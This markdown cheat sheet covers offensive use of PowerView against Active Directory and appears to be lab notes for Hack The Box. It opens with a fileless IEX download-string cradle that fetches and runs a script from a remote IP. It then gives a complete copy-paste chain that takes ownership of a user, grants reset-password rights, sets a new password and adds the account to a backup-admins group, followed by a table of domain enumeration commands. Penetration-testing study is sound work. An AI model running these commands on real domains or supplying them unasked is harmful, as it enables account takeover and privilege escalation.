# PowerView.ps1

## Fileless (Running PS1 without saving to disk)
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
```

## Take Ownership over User
- Prerequisite is to have PowerView loaded

```
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## Reset Password
- Prerequisite is to have PowerView loaded
- Take ownership of user

```
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
```

## Build New Credential
```
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
```

## Add user to group
## Reset Password
- Prerequisite is to have PowerView loaded
- Take ownership of user
- Build the $cred
```
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
```

## Check AD Groups with PowerView
```
Get-DomainGroup -MemberIdentity Herman | select SamAccountName
```

## All Steps in Order
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose
$pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
$cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
Get-DomainGroup -MemberIdentity Herman | select SamAccountName
```

## Get UserAccountControl for Domain Users
```
Import-Module .\PowerView.ps1 OR . .\PowerView.ps1
Get-DomainUser * -AdminCount | select samaccountname,useraccountcontrol
```

## DSQuery (find passwords that dont expire)
```
dsquery user "OU=Employees,DC=inlanefreight,DC=local" -name * -scope subtree -limit 0 | dsget user -samid -pwdneverexpires | findstr /V no
```

## PowerView Most Used Commands 
[Additional Reference: PowerShell and PowerView Modules](../Powershell%20AD%20%26%20Powerview%20Modules/README.md)

| Command | Description | 
| ---------------------------- | ---------------------------- |
| Export-PowerViewCSV | Append results to a CSV file | 
| ConvertTo-SID | Convert a user or group NAME to SID value | 
| Get-DomainSPNTicket | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account | 
| Get-Domain | Returns the AD object for the current or specific domain | 
| Get-DomainController | Return a list of Domain Controllers for the specified domain | 
| Get-DomainUser | Will return all users or specific user objects in AD | 
| Get-DomainComputer | Will return all computers or specific computer objects in AD | 
| Get-DomainGroup | Will return all groups or specific group objects in AD | 
| Get-DomainOU | Search for all or specific OU in AD | 
| Find-InterestingDomainAcl | Finds object ACLs in the domain with modification rights set to non-built in objects | 
| Get-DomainGroupMember | Will return the members of a specific domain group | 
| Get-DomainFileServer | Returns a list of servers likely functioning as file servers | 
| Get-DomainDFSShare | Returns a list of all distributed file systems for the current (or specified) domain | 
| Get-DomainGPO | Will return all GPOs or specific GPO objects in AD | 
| Get-DomainPolicy | Returns the default domain policy or the domain controller policy for the current domain | 
| Get-NetlocalGroup | Enumerates local groups on the local or a remote machine | 
| Get-NetLocalGroupMember | Enumerates member of a specific local group | 
| Get-NetShare | Returns open shares on the local (or remote) machine | 
| Get-NetSession | Will return session information for the local (or a remote) machine | 
| Test-AdminAccess | Tests if the current user has admin access to the local or a remote machine | 
| Find-DomainUserLocation | Finds machines where specific users are logged in | 
| Find-DomainShare | Finds reachable shares on domain machines | 
| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain | 
| Find-LocalAdminAccess | Find machines on the local domain where the current user has local admin access | 
| Get-DomainTrust | Returns domain trusts for the current domain or a specified domain | 
| Get-ForestTrust | Returns all forest trusts for the current forest or a specified forest | 
| Get-DomainForeignUser | Enumerates users who are in groups outside of the user's domain | 
| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member | 
| Get-DomainTrustMapping | Will enumerate all trusts for the current domain and any others seen | 

- Another alternative to PowerView is the C# version called, SharpView.  Many of the same commands will work.